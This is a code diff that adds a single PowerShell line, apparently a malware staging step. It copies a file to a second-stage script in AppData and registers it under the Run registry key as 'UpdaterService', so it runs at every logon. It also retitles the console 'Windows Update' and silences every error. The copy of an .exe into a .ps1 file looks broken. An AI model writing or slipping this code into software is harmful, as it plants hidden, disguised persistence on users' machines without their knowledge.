@@ -1,0 +1,2 @@
+
+<# Stage transfer #> Copy-Item -Path 'C:\ProgramData\svcupdate.exe' -Destination "$env:APPDATA\stage2.ps1" -Force -ErrorAction SilentlyContinue; Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "UpdaterService" -Value ('powershell.exe -NoP -File "' + "$env:APPDATA\stage2.ps1" + '"') -Force -ErrorAction SilentlyContinue; $Host.UI.RawUI.WindowTitle = "Windows Update"; $StageMarker = "stage-14"
